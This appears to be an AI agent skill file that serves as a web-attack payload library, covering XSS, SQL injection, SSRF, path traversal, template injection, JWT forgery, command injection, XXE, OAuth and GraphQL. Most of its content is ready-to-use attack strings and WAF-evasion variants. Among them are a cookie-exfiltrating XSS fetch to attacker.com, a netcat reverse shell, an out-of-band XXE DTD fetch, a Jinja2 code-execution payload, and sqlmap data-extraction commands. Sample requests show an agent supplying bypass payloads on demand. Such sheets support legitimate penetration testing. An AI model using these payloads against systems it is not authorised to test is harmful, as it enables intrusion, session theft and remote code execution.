---
name: payload-library
description: |
  Comprehensive payload library and methodology guide organized by vulnerability class. Covers
  XSS, SQLi, SSRF, XXE, IDOR, Open Redirect, Path Traversal, SSTI, Command Injection, JWT
  attacks, OAuth flaws, GraphQL abuse, and WAF bypass techniques. Use when: selecting payloads
  for manual testing, adapting payloads for a specific tech stack, or following the methodology
  for a specific vuln class.
metadata: { "openclaw": { "emoji": "📦" } }
---

# Payload Library & Methodology Guide

Organized by vulnerability class. Each section includes: when to test, methodology steps,
payload sets (basic → advanced → WAF bypass), and validation criteria.

---

## XSS — Cross-Site Scripting

**Test when:** Any user-controlled input reflected in HTML, JS, or attributes.

### Methodology

1. Identify all reflection points (URL params, form fields, headers, cookies)
2. Test basic `<script>alert(1)</script>` — note if blocked or filtered
3. Try attribute injection: `"><img src=x onerror=alert(1)>`
4. Test DOM sinks: search JS source for `innerHTML`, `eval`, `document.write`
5. Check for stored XSS: submit payload, retrieve on another page
6. Confirm with `alert(document.domain)` or `fetch('//attacker.com/'+document.cookie)`

### Basic Payloads

```html
<script>
  alert(document.domain);
</script>
<img src="x" onerror="alert(1)" />
">
<script>
  alert(1);
</script>
javascript:alert(1)
<svg onload="alert(1)">';alert(1)// \";alert(1)//</svg>
```

### Advanced Payloads

```html
<!-- Attribute context -->
" onfocus=alert(1) autofocus x="
' onmouseover='alert(1)

<!-- URL context -->
javascript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Template strings -->
${alert(1)}
{{constructor.constructor('alert(1)')()}}

<!-- HTML entities -->
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
```

### WAF Bypass

```html
<ScRiPt>alert(1)</sCrIpT>
<script>eval(atob('YWxlcnQoMSk='))</script>
<svg/onload=\u0061\u006C\u0065\u0072\u0074(1)>
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<iframe srcdoc="&#60;script&#62;alert(1)&#60;/script&#62;">
<scr<!---->ipt>alert(1)</scr<!---->ipt>
<a href="jAvAsCrIpT:alert(1)">x</a>
```

---

## SQLi — SQL Injection

**Test when:** Any parameter that queries a database (search, login, ID params, filters).

### Methodology

1. Add `'` to each parameter — check for SQL errors or behavioral change
2. Try `1 AND 1=1--` vs `1 AND 1=2--` — different responses = boolean SQLi
3. Try `1; WAITFOR DELAY '0:0:5'--` — delay = time-based blind
4. Run sqlmap to confirm and extract data

### Detection Payloads

```sql
'
''
`
1' AND '1'='1
1' AND '1'='2
1 AND 1=1--
1 AND 1=2--
1; WAITFOR DELAY '0:0:5'--   (MSSQL)
1' AND SLEEP(5)--             (MySQL)
1' AND pg_sleep(5)--          (PostgreSQL)
1 UNION SELECT NULL--
1 UNION SELECT NULL,NULL--
```

### WAF Bypass

```sql
SE/**/LECT * FR/**/OM users
%53%45%4C%45%43%54 * FROM users
SeLeCt * FrOm users WHeRe 1=1
1/*!UNION*//*!SELECT*/NULL--
SELECT%091%09FROM%09users
1 UNION%23comment%0ASELECT NULL--
```

### sqlmap Commands

```bash
# Basic
sqlmap -u "https://target.com/page?id=1" --dbs --batch

# POST
sqlmap -u "https://target.com/login" --data "user=admin&pass=x" --dbs --batch

# With WAF bypass
sqlmap -u "https://target.com/?id=1" --tamper=space2comment,charencode,randomcase --level=3 --risk=2

# Headers
sqlmap -u "https://target.com/" -H "X-Custom-IP: 1*" --dbs --batch
```

---

## SSRF — Server-Side Request Forgery

**Test when:** Any parameter that accepts a URL, IP, hostname, or domain.

### Methodology

1. Find params: `url`, `uri`, `src`, `path`, `redirect`, `next`, `dest`, `target`, `link`, `fetch`
2. Try `http://127.0.0.1/` — check for different response vs external URL
3. Try AWS metadata: `http://169.254.169.254/latest/meta-data/`
4. Set up a Burp Collaborator or interactsh listener for OOB confirmation
5. Try protocol smuggling: `gopher://`, `dict://`, `file://`

### Payloads

```
http://127.0.0.1/
http://localhost/
http://[::1]/
http://0.0.0.0/
http://169.254.169.254/latest/meta-data/          (AWS IMDS)
http://metadata.google.internal/computeMetadata/v1/ (GCP)
http://169.254.169.254/metadata/instance           (Azure)
file:///etc/passwd
dict://127.0.0.1:6379/INFO
gopher://127.0.0.1:25/HELO
```

### WAF Bypass

```
http://2130706433/             (127.0.0.1 decimal)
http://0x7f000001/             (127.0.0.1 hex)
http://127.000.000.001/
http://[::ffff:127.0.0.1]/
http://localhost.localstack.cloud/
http://169.254.169.254@evil.com/  (URL parser bypass)
http://evil.com#.127.0.0.1
```

---

## IDOR — Insecure Direct Object Reference

**Test when:** Any endpoint with a resource ID (numeric, UUID, GUID, slug).

### Methodology

1. Create two accounts (A and B)
2. Create a resource with account A — note the ID
3. Access that resource with account B's session
4. Try: incrementing ID, substituting your own UUID, using B's session on A's resources
5. Test all HTTP methods: GET, PUT, PATCH, DELETE

### Test Patterns

```
/api/v1/users/1234/profile          → try 1233, 1235
/api/v1/orders/550e8400-e29b...     → try your own order UUID
/api/v1/documents?user_id=1234      → change to another user's ID
/download?file_id=abc123            → enumerate other IDs
DELETE /api/v1/users/1234           → can account B delete account A?
```

---

## Path Traversal / LFI

**Test when:** Any param that reads a file (name, path, file, template, include, page).

### Payloads

```
../../../etc/passwd
..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252Fetc%252Fpasswd
....//....//etc/passwd
%2e%2e%2f%2e%2e%2fetc%2fpasswd
..\/..\/etc\/passwd
/..%00/..%00/etc/passwd
php://filter/convert.base64-encode/resource=/etc/passwd
```

### Validation Signatures

```
Linux:   root:x:0:0:root
Windows: [boot loader]
PHP src: base64 → decode → look for <?php
```

---

## SSTI — Server-Side Template Injection

**Test when:** Any template-like reflection in responses.

### Detection Probes (by engine)

```
{{7*7}}        → 49  (Jinja2, Twig)
${7*7}         → 49  (Freemarker, Thymeleaf, Spring EL)
<%= 7*7 %>     → 49  (ERB, EJS)
#{7*7}         → 49  (Ruby Slim)
*{7*7}         → 49  (Spring EL)
${{7*7}}       → 49  (Pebble)
```

### RCE via SSTI (Jinja2 / Python)

```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

---

## JWT Attacks

**Test when:** App uses JWT tokens (look for `eyJ` in cookies/headers).

### Attacks

```bash
# 1. alg:none attack
# Decode JWT, change alg to "none", remove signature
echo '{"alg":"none"}' | base64  # craft header

# 2. Weak secret brute-force
hashcat -a 0 -m 16500 jwt.txt wordlists/rockyou.txt

# 3. RS256 → HS256 confusion
# Take RS256 public key, sign with HS256 using pub key as secret
python3 jwt_tool.py TOKEN -X k -pk public.pem

# 4. kid header injection
# kid: "../../dev/null"
# kid: "'; DROP TABLE keys;--"
```

---

## Open Redirect

**Test when:** Params like `redirect`, `next`, `return`, `url`, `goto`, `dest`, `r`.

### Payloads

```
https://evil.com
//evil.com
///evil.com
////evil.com
/\evil.com
//evil.com/%2F..
https://trusted.com@evil.com
https://evil.com?trusted.com
data:text/html,<script>window.location='https://evil.com'</script>
```

---

## Command Injection

**Test when:** Params passed to OS commands (ping, dig, curl, nmap wrappers, filename params).

### Payloads

```bash
; id
| id
&& id
|| id
$(id)
`id`
; sleep 5
| ping -c 5 127.0.0.1
; nc -e /bin/sh attacker.com 4444
```

### WAF Bypass

```bash
${IFS}id
{cat,/etc/passwd}
$'i\144'             # \144 = 'd'
/???/??d             # matches /bin/id via wildcard
c''at /etc/pa''sswd  # quote insertion
```

---

## XXE — XML External Entity

**Test when:** App accepts XML input (SOAP, REST with XML, file upload of XML/SVG/DOCX).

### Payloads

```xml
<!-- File read -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<test>&xxe;</test>

<!-- OOB (blind) -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<test/>

<!-- SSRF via XXE -->
<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<test>&ssrf;</test>
```

---

## OAuth / SSO Flaws

**Test when:** App uses OAuth, SAML, or SSO login.

### Tests

```
1. state parameter missing / not validated → CSRF on OAuth flow
2. redirect_uri whitelist bypass:
   - https://trusted.com.evil.com/
   - https://trusted.com/../../evil
   - https://trusted.com?redirect=https://evil.com
3. Authorization code reuse (code replay)
4. token leakage via Referer header
5. PKCE missing → code interception
6. Account takeover via email mismatch
```

---

## GraphQL Abuse

**Test when:** App uses GraphQL endpoint (`/graphql`, `/api/graphql`).

### Tests

```graphql
# 1. Introspection (check if enabled)
{ __schema { types { name fields { name } } } }

# 2. Batching attack (rate limit bypass)
[{"query":"mutation { login(user:\"a\", pass:\"1\") }"},
 {"query":"mutation { login(user:\"a\", pass:\"2\") }"}]

# 3. IDOR via IDs in queries
query { user(id: "other-user-id") { email password } }

# 4. Excessive data exposure
query { users { id email password ssn creditCard } }
```

---

## Quick Reference — Methodology by Phase

| Phase       | Action                                         |
| ----------- | ---------------------------------------------- |
| Recon       | Subdomain enum → live probe → tech fingerprint |
| Surface map | Find all params, endpoints, file uploads, APIs |
| Passive     | Check JS, robots.txt, .git, Shodan for leaks   |
| Active      | One vuln class at a time, methodology above    |
| Confirm     | PoC → screenshot → CVSS score                  |
| Report      | Use report-generator skill                     |

---

## Usage from Agent

```
Give me all XSS WAF bypass payloads for a Cloudflare-protected site
What's the methodology for testing IDOR?
Give me the SSTI detection payloads for Python/Jinja2
Generate a sqlmap command with WAF bypass for this URL
What parameters should I test for SSRF on a REST API?
Walk me through the OAuth testing methodology
```
